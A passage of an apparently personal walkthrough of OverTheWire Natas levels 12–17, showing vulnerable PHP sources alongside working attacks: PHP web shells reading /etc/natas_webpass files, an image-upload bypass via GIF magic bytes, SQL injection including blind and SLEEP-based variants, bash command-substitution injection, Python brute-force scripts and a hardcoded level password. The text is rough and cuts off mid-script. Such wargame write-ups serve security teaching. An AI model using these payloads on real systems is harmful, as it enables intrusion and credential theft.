    <span class="k">for</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$p</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$string</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)];</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>The second string uses the random name to create a path name for the uploaded file. Notice that while the name is created in the server side:</p>
<div class="highlight"><pre><span class="x">function makeRandomPath($dir, $ext) {</span>
<span class="x">    do {</span>
<span class="x">    $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;</span>
<span class="x">    } while(file_exists($path));</span>
<span class="x">    return $path;</span>
<span class="x">}</span>

<span class="x">function makeRandomPathFromFilename($dir, $fn) {</span>
<span class="x">    $ext = pathinfo($fn, PATHINFO_EXTENSION);</span>
<span class="x">    return makeRandomPath($dir, $ext);</span>
<span class="x">}</span>
</pre></div>


<p>The extension is given by the bronswer:</p>
<div class="highlight"><pre><span class="nt">&lt;form</span> <span class="na">enctype=</span><span class="s">&quot;multipart/form-data&quot;</span> <span class="na">action=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;MAX_FILE_SIZE&quot;</span> <span class="na">value=</span><span class="s">&quot;1000&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;filename&quot;</span> <span class="na">value=</span><span class="s">&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot;</span> <span class="nt">/&gt;</span>
Choose a JPEG to upload (max 1KB):<span class="nt">&lt;br/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&quot;uploadedfile&quot;</span> <span class="na">type=</span><span class="s">&quot;file&quot;</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Upload File&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</pre></div>


<p>The next function peforms the file upload. Notice that the code does not check wether <em>filename</em> is actually a JPG file:</p>
<div class="highlight"><pre><span class="x">if(array_key_exists(&quot;filename&quot;, $_POST)) {</span>
<span class="x">    $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);</span>
<span class="x">        if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &gt; 1000) {</span>
<span class="x">        echo &quot;File is too big&quot;;</span>
<span class="x">    } else {</span>
<span class="x">        if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) {</span>
<span class="x">            echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;</span>
<span class="x">        } else{</span>
<span class="x">            echo &quot;There was an error uploading the file, please try again!&quot;;</span>
<span class="x">        }</span>
<span class="x">    }</span>
<span class="x">} else {</span>
<span class="x">?&gt;</span>
</pre></div>


<p>We ca upload whatever file we want. How about the following script which uses the function <a href="http://php.net/manual/en/function.readfile.php">readfile()</a>?</p>
<div class="highlight"><pre><span class="cp">&lt;?php</span>
<span class="nb">readfile</span><span class="p">(</span><span class="s1">&#39;/etc/natas_webpass/natas13&#39;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>we could also use a <a href="http://php.net/manual/en/function.system.php">system</a> command:</p>
<div class="highlight"><pre><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s2">&quot;cat /etc/natas_webpass/natas13&quot;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>Or we could even use [passthru] again:</p>
<div class="highlight"><pre><span class="x"> </span><span class="cp">&lt;?php</span>
 <span class="nb">passthru</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
 <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>&lt;?
 echo(exec('cat /etc/natas_webpass/natas13'));
 ?&gt;</p>
<p>The only thing we can control is the extension, snce we can tamper it with POST data.</p>
<p>However, there is an additional problem. The upload will attempt to change the file's extension to <em>jpg</em>. There are several ways to work our way around this. For instance, we could use any proxy or borwser extension, such as <a href="http://portswigger.net/burp/">Burp Suite</a> or [] to change the filename when sending to the server. The steps of this attack are the following:</p>
<ol>
<li>Our exploit in PHP is uploaded by the server and renamed with a random string and a <em>jpg</em> extension.</li>
<li>We interscept it and change the extension to <em>php</em>.</li>
<li>We send it to the server, which will calls the function MakeRandomPathFromFilename("upload","exploit.php"). The extension now is <em>php</em> and this is sent to the function MakeRandomPath('upload', '.php').</li>
<li>The server return the link */upload/randomString.php", which will run our exploit.</li>
</ol>
<p>If this is your first time with Burp, <a href="http://portswigger.net/burp/help/suite_gettingstarted.html">this is how you run it</a>. Burp functions as an HTTP proxy server, and all HTTP/S traffic from your browser passes through Burp</p>
<div class="highlight"><pre><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="o">-</span><span class="n">Xmx1024m</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">burp</span><span class="p">.</span><span class="n">jar</span>
</pre></div>


<ol>
<li>Go to the proxy tab and then options and confirm Burp's Proxy listener is active at 127.0.0.1:8080:</li>
</ol>
<p><img alt="" src="" /></p>
<ol>
<li>Set the proxy configuration in your browser or system to this address:</li>
</ol>
<p><img alt="" src="" /></p>
<ol>
<li>In Burp go Proxy --&gt; Intercept and mark it ON</li>
</ol>
<p><img alt="" src="" /></p>
<ol>
<li>
<p>Load the Natas12 page and accept the initial intercepts (forwarding it). Upload the <em>php</em> exploit.
<img alt="" src="" /></p>
</li>
<li>
<p>Before you foward this request in burp, change the name of the random string. jpg to the php exploit. Foward it
<img alt="" src="" /></p>
</li>
<li>
<p>Clique the link in your browser and you have the passowrd.</p>
</li>
</ol>
<h3>Level 13: File Inclusion Attack II</h3>
<p>This level look just like the previous one, except by the message "For security reasons, we now only accept image files!".</p>
<p>We take a look at the source code and the only difference from the code before an if clause:</p>
<div class="highlight"><pre><span class="cp">&lt;?</span>
<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;filename&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$target_path</span> <span class="o">=</span> <span class="nx">makeRandomPathFromFilename</span><span class="p">(</span><span class="s2">&quot;upload&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;filename&quot;</span><span class="p">]);</span>


        <span class="k">if</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;File is too big&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;File is not an image&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$target_path</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;The file &lt;a href=</span><span class="se">\&quot;</span><span class="si">$target_path</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="si">$target_path</span><span class="s2">&lt;/a&gt; has been uploaded&quot;</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;There was an error uploading the file, please try again!&quot;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>The clause use the PHP function  <a href="http://php.net/manual/en/function.exif-imagetype.php">exif_imagetype</a> to check if the file is a type of image. The way it works is by checking the firsts bytes of the image and see if it has an image signature. This signature is know as <a href="http://en.wikipedia.org/wiki/List_of_file_signatures">magic number</a> and every binary has one. So adding the right signature can tamper the different file. The <em>jpg</em> magic number can is</p>
<div class="highlight"><pre><span class="n">Hex</span> <span class="n">digits</span> <span class="n">xx</span> <span class="o">=</span> <span class="n">variable</span>
<span class="n">JPEG</span> <span class="n">File</span> <span class="n">Interchange</span> <span class="n">Format</span>    <span class="n">jpg</span> <span class="n">ff</span> <span class="n">d8</span> <span class="n">ff</span> <span class="n">e0</span>
</pre></div>


<p>http://en.wikipedia.org/wiki/Graphics_Interchange_Format</p>
<div class="highlight"><pre><span class="nx">GIF89a</span>
<span class="cp">&lt;?php</span>
<span class="nb">readfile</span><span class="p">(</span><span class="s1">&#39;/etc/natas_webpass/natas14</span>
<span class="s1">&#39;</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></div>


<p>We add this to our script from the previous level and follow the same steps as before to recover the password for the next level.</p>
<p>``
echo -e "\xff\xd8\xff\xe0" &gt;</p>
<div class="highlight"><pre><span class="err">###</span> <span class="nx">Level</span> <span class="mi">14</span><span class="p">:</span> <span class="nb">SQL</span> <span class="nx">Injection</span>


<span class="nx">This</span> <span class="nx">level</span> <span class="nx">starts</span> <span class="k">with</span> <span class="nx">a</span> <span class="nx">Username</span> <span class="ow">and</span> <span class="nx">Password</span> <span class="nb">form</span><span class="p">:</span>

<span class="o">!</span><span class="err">[</span><span class="cp">]</span>()

Looking at the sourcecode, we have a simple connection to the a MySQL server, and a SQL query for the username and password to look for a record in the database:

```php
<span class="cp">&lt;?</span>
<span class="cp">if(array_key_exists(&quot;username&quot;, $_REQUEST)) {</span>
<span class="cp">    $link = mysql_connect(&#39;localhost&#39;, &#39;natas14&#39;, &#39;&lt;censored&gt;&#39;);</span>
<span class="cp">    mysql_select_db(&#39;natas14&#39;, $link);</span>

<span class="cp">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[</span><span class="s2">&quot;username&quot;</span><span class="cp">].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[</span><span class="s2">&quot;password&quot;</span><span class="cp">].&quot;\&quot;&quot;;</span>
<span class="cp">    if(array_key_exists(&quot;debug&quot;, $_GET)) {</span>
<span class="cp">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span>
<span class="cp">    }</span>

<span class="cp">    if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {</span>
<span class="cp">            echo &quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;;</span>
<span class="cp">    } else {</span>
<span class="cp">            echo &quot;Access denied!&lt;br&gt;&quot;;</span>
<span class="cp">    }</span>
<span class="cp">    mysql_close($link);</span>
<span class="cp">} else {</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span>
Username: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span><span class="nt">&gt;&lt;br&gt;</span>
Password: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span><span class="nt">&gt;&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;? } ?&gt;</span>
</pre></div>


<p>If the query returns one or more row, the receive a output message  with the password for the next level. Another detail is the <em>GET</em> if clause, which declares the parameter <em>debug</em> wihtout checking if this is a safe query input. Remember that for all GET parameters, they can look at the URL by '?debug' in the end:</p>
<div class="highlight"><pre><span class="nl">http:</span><span class="c1">//natas14.natas.labs.overthewire.org/index.php?username=admin&amp;password=pass</span>
</pre></div>


<p>Sending this query, we get:</p>
<p>This is case of <a href="https://www.owasp.org/index.php/SQL_Injection">SQL Injection</a>.</p>
<p>The simpkest atack is incluing an <strong>always true clause</strong> in the WHERE part which can be represented by</p>
<div class="highlight"><pre><span class="n">OR</span> <span class="sc">&#39;1&#39;</span><span class="o">=</span><span class="sc">&#39;1&#39;</span>
</pre></div>


<p>This will always return records.</p>
<div class="highlight"><pre><span class="n">SELECT</span> <span class="o">*</span> <span class="n">from</span> <span class="n">users</span> <span class="n">where</span> <span class="n">username</span><span class="o">=</span><span class="s">&quot;$(Username)&quot;</span> <span class="n">and</span> <span class="n">password</span><span class="o">=</span><span class="s">&quot;$(Password)&quot;</span>
<span class="n">SELECT</span> <span class="o">*</span> <span class="n">from</span> <span class="n">users</span> <span class="n">where</span> <span class="n">username</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="n">and</span> <span class="n">password</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="n">OR</span> <span class="s">&quot;1&quot;</span><span class="o">=</span><span class="s">&quot;1&quot;</span>
</pre></div>


<p>All we need to do is crafting the right URL, knowing that space will be translated to <em>%20</em> and <em>""</em> wil be translated to <em>%22</em>:</p>
<p>http://natas14.natas.labs.overthewire.org/index.php?username=admin&amp;password=pass" OR "1"="1</p>
<p>+</p>
<p>" OR "1"="1</p>
<div class="highlight"><pre><span class="nl">http:</span><span class="c1">//natas14.natas.labs.overthewire.org/index.php?username=admin&amp;password=pass%22%20OR%20%221%22=%221</span>
</pre></div>


<p>This URL give us the password.</p>
<p>A classical way to solve this is:
1. Setting the username with <em>admin</em>,
2. Setting the password with "OR 1=1 — "</p>
<h3>Level 15: SQL Injection II</h3>
<p>This level starts with a  form to check the existence of some username:
<img alt="" src="" /></p>
<p>Checking the sourcecode we have a code almost equal to the previous level, with exception of this part:</p>
<div class="highlight"><pre><span class="x">/*</span>
<span class="x">CREATE TABLE `users` (</span>
<span class="x">  `username` varchar(64) DEFAULT NULL,</span>
<span class="x">  `password` varchar(64) DEFAULT NULL</span>
<span class="x">);</span>
<span class="x">*/</span>
</pre></div>


<p>And the fact that the $query is different, it obviously does not have a password part:</p>
<div class="highlight"><pre><span class="x">if(array_key_exists(&quot;username&quot;, $_REQUEST)) {</span>
<span class="x">    $link = mysql_connect(&#39;localhost&#39;, &#39;natas15&#39;, &#39;&lt;censored&gt;&#39;);</span>
<span class="x">    mysql_select_db(&#39;natas15&#39;, $link);</span>

<span class="x">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span>
<span class="x">    if(array_key_exists(&quot;debug&quot;, $_GET)) {</span>
<span class="x">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span>
<span class="x">    }</span>

<span class="x">    $res = mysql_query($query, $link);</span>
<span class="x">    if($res) {</span>
<span class="x">    if(mysql_num_rows($res) &gt; 0) {</span>
<span class="x">        echo &quot;This user exists.&lt;br&gt;&quot;;</span>
<span class="x">    } else {</span>
<span class="x">        echo &quot;This user doesn&#39;t exist.&lt;br&gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    } else {</span>
<span class="x">        echo &quot;Error in query.&lt;br&gt;&quot;;</span>
<span class="x">    }</span>

<span class="x">    mysql_close($link);</span>
<span class="x">} else {</span>
<span class="x">?&gt;</span>
</pre></div>


<p>Differently from the previous level, we can't just modify the query to return a record because it is hygienized for <em>"</em>. However the additional information about the propruets if th table will be enough to craft an attack in the only query that is available.</p>
<p>If we check the existence of users nata15 or natas17, we get "The user doesn;t exist" message. However, if we check for natas16 we see that this user exists.</p>
<p>So since checking this user name will alwyas be true, we cna just add another clause to the querey using the keyword AND:</p>
<p>For example, if we type</p>
<div class="highlight"><pre><span class="n">natas14</span><span class="s">&quot; OR &quot;</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
</pre></div>


<p>in the form, we get a "the user exists, because 1=1 is always true.</p>
<p>http://www.w3schools.com/sql/sql_wildcards.asp</p>
<div class="highlight"><pre><span class="n">SELECT</span> <span class="o">*</span> <span class="n">from</span> <span class="n">users</span> <span class="n">where</span> <span class="n">username</span><span class="o">=</span><span class="s">&quot;natas16&quot;</span> <span class="n">AND</span> <span class="o">&lt;</span><span class="n">additional</span> <span class="n">clause</span><span class="o">&gt;</span><span class="p">;</span>
</pre></div>


<p>What will be this addicional clause?</p>
<p>WHERE password LIKE "[1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]%</p>
<p>natas16" AND password LIKE "[%a%]</p>
<p>"[1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]%"</p>
<p>[1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]</p>
<p>But which chars? We need to write a script to brute force it! Lets first check the size of the password using the keyword</p>
<p>the BINARY keyword forces a binary check</p>
<p>SELECT * from users where username="natas16" AND SUBSTRING(password,1,1) = BINARY "a";</p>
<p>(“This user doesn’t exist.”/”This user exists.”)</p>
<p>http://www.1keydata.com/sql/sql-substring.html</p>
<p>SUBSTR (str, position, [length])</p>
<p>http://docs.python-requests.org/en/latest/</p>
<div class="highlight"><pre><span class="c">#! /usr/bin/python</span>

<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>


<span class="k">def</span> <span class="nf">brute_force_password</span><span class="p">(</span><span class="n">LENGTH</span><span class="p">,</span> <span class="n">AUTH</span><span class="p">,</span> <span class="n">CHARS</span><span class="p">,</span> <span class="n">SQL_URL1</span><span class="p">,</span> <span class="n">SQL_URL2</span><span class="p">,</span> <span class="n">KEYWORD</span><span class="p">):</span>

        <span class="n">password</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">LENGTH</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
            <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">CHARS</span><span class="p">)):</span>

                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span> <span class="p">(</span> <span class="n">SQL_URL1</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">SQL_URL2</span> <span class="o">+</span> <span class="n">CHARS</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="p">),</span> <span class="n">auth</span><span class="o">=</span><span class="n">AUTH</span><span class="p">)</span>
                <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">url</span>

                <span class="k">if</span> <span class="n">KEYWORD</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
                        <span class="n">password</span> <span class="o">+=</span> <span class="n">CHARS</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
                        <span class="k">print</span><span class="p">(</span><span class="s">&quot;Password so far: &quot;</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
                        <span class="k">break</span>

        <span class="k">return</span> <span class="n">password</span>



<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>

        <span class="c"># authorization: login and password</span>
        <span class="n">AUTH</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas15&#39;</span><span class="p">,</span> <span class="s">&#39;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#39;</span><span class="p">)</span>


        <span class="c"># BASE64 password and 32 bytes</span>
        <span class="n">CHARS</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
        <span class="n">LENGTH</span> <span class="o">=</span> <span class="mi">32</span>

        <span class="c"># crafted url option 1</span>
        <span class="n">SQL_URL1</span> <span class="o">=</span> <span class="s">&#39;http://natas15.natas.labs.overthewire.org?username=natas16&quot; AND SUBSTRING(password,&#39;</span>
        <span class="n">SQL_URL2</span> <span class="o">=</span> <span class="s">&#39;,1) LIKE BINARY &quot;&#39;</span>
        <span class="n">KEYWORD</span> <span class="o">=</span> <span class="s">&#39;exists&#39;</span>

        <span class="k">print</span><span class="p">(</span><span class="n">brute_force_password</span><span class="p">(</span><span class="n">LENGTH</span><span class="p">,</span> <span class="n">AUTH</span><span class="p">,</span> <span class="n">CHARS</span><span class="p">,</span> <span class="n">SQL_URL1</span><span class="p">,</span> <span class="n">SQL_URL2</span><span class="p">,</span> <span class="n">KEYWORD</span><span class="p">))</span>
</pre></div>


<p>After around 10 minutes we have our password.</p>
<h3>Level 16: OS Command Injection III</h3>
<p>This level starts with a searching form:
<img alt="" src="" /></p>
<p>The source code is similar to the levels 9 and 10:</p>
<div class="highlight"><pre><span class="x">&lt;pre&gt;</span>
<span class="cp">&lt;?</span>
<span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;`\&#39;&quot;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">print</span> <span class="s2">&quot;Input contains an illegal character!&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="se">\&quot;</span><span class="si">$key</span><span class="se">\&quot;</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;/pre&gt;</span>
</pre></div>


<p>wth exception that we are hyginezing for <em>`</em>, <em>"</em>, and <em>'</em> this time. So the old attack adding <em>""</em> won't work. We need to figure out what else we can use.</p>
<p>In Bash, there is a propriety called [command substitution] which commands can be passed with
<code>$(command)</code></p>
<p>for example, we, a simple command to see the date:</p>
<div class="highlight"><pre><span class="err">$</span> <span class="n">MY_CMD</span><span class="o">=</span><span class="s">&quot;$(date)&quot;</span>
<span class="err">$</span> <span class="n">echo</span> <span class="err">$</span><span class="n">MY_CMD</span>
<span class="n">Wed</span> <span class="n">Oct</span> <span class="mi">14</span> <span class="mi">20</span><span class="o">:</span><span class="mi">23</span><span class="o">:</span><span class="mi">41</span> <span class="n">EDT</span> <span class="mi">2014</span>
</pre></div>


<p>http://www.tldp.org/LDP/abs/html/commandsub.html</p>
<p>Now we are ready to craft a command in the variable <code>$key$$ inside the</code>grep -i \"$key\" dictionary.txt``` using command substitution.</p>
<p>grep can use regular expression with Interpret PATTERN as  an  extended  regular  expression  (ERE,  see
              below).  (-E is specified by POSIX.)</p>
<p>grep -E '{1'  searches  for  the  two-character
       string  {1  instead of reporting a syntax error in the regular expression.
       POSIX allows this behavior as an extension, but  portable  scripts  should
       avoid it.</p>
<p>if you just use this in the form:
$(grep -E ^a.* /etc/natas_webpass/natas17)bananas
we get the words with banana. No errors. Good.</p>
<p>the regex wildcard .* means any</p>
<p>'a' is the first char  searched, and since its not in the password, it dosnt retur anything from the grep command, so the seatch goes to banana and works. however if a were in the password, the grep would return a, and this would be glued to banaha, and the word abanana dpesmt exist sp no output would be returned!</p>
<p>if it was we would see any output</p>
<p>so we make a script that brute-foce for each character</p>
<p>http://natas16.natas.labs.overthewire.org/?needle=CRAFTED_QUERY_HERE&amp;submit=Search</p>
<p>http://natas16.natas.labs.overthewire.org/?needle=$(grep%20-E%20^a.*%20/etc/natas_webpass/natas17)banana&amp;submit=Search</p>
<p>Around 10 minutes later we get our password.</p>
<h3>Level 17: SQL Injection III</h3>
<p>This level starts with similar Username search from levels 14 and 15..</p>
<p>This time the source code is:</p>
<div class="highlight"><pre><span class="x">/*</span>
<span class="x">CREATE TABLE `users` (</span>
<span class="x">  `username` varchar(64) DEFAULT NULL,</span>
<span class="x">  `password` varchar(64) DEFAULT NULL</span>
<span class="x">);</span>
<span class="x">*/</span>

<span class="x">if(array_key_exists(&quot;username&quot;, $_REQUEST)) {</span>
<span class="x">    $link = mysql_connect(&#39;localhost&#39;, &#39;natas17&#39;, &#39;&lt;censored&gt;&#39;);</span>
<span class="x">    mysql_select_db(&#39;natas17&#39;, $link);</span>

<span class="x">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span>
<span class="x">    if(array_key_exists(&quot;debug&quot;, $_GET)) {</span>
<span class="x">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span>
<span class="x">    }</span>

<span class="x">    $res = mysql_query($query, $link);</span>
<span class="x">    if($res) {</span>
<span class="x">    if(mysql_num_rows($res) &gt; 0) {</span>
<span class="x">        //echo &quot;This user exists.&lt;br&gt;&quot;;</span>
<span class="x">    } else {</span>
<span class="x">        //echo &quot;This user doesn&#39;t exist.&lt;br&gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    } else {</span>
<span class="x">        //echo &quot;Error in query.&lt;br&gt;&quot;;</span>
<span class="x">    }</span>

<span class="x">    mysql_close($link);</span>
<span class="x">} else {</span>
<span class="x">?&gt;</span>
</pre></div>


<p>The difference now is that the echo commands are commented. This means that we can't use the same script you had before, and wont know whether the  we got a right char.</p>
<p>There are other ways we can get a binary indicator though. For example, we can play with time.</p>
<p>MySQL has a query <em>sleep</em> that pauses thfor a number of seconds
http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_sleep</p>
<p>SELECT * from users where username="natas18" AND SUBSTRING(password,</p>
<p>',1) LIKE BINARY and SLEEP(5) AND "1"="1</p>
<p>http://natas15.natas.labs.overthewire.org/?username=natas16%22%20AND%20SUBSTRING(password,1,1)%20LIKE%20BINARY%20%22d%22%20AND%20SLEEP(320)%20AND%20%221%22=%221</p>
<p>The new script is:</p>
<div class="highlight"><pre><span class="c">#! /usr/bin/python</span>

<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>


<span class="k">def</span> <span class="nf">brute_force_password</span><span class="p">(</span><span class="n">LENGTH</span><span class="p">,</span> <span class="n">AUTH</span><span class="p">,</span> <span class="n">CHARS</span><span class="p">,</span> <span class="n">SQL_URL1</span><span class="p">,</span> <span class="n">SQL_URL2</span><span class="p">):</span>

        <span class="n">password</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">LENGTH</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
            <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">CHARS</span><span class="p">)):</span>
                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span> <span class="p">(</span> <span class="n">SQL_URL1</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">SQL_URL2</span> <span class="o">+</span> <span class="n">CHARS</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">+</span> <span class="n">SQL_URL3</span> <span class="p">),</span> <span class="n">auth</span><span class="o">=</span><span class="n">AUTH</span><span class="p">)</span>
                <span class="n">time</span> <span class="o">=</span>  <span class="n">r</span><span class="o">.</span><span class="n">elapsed</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span>

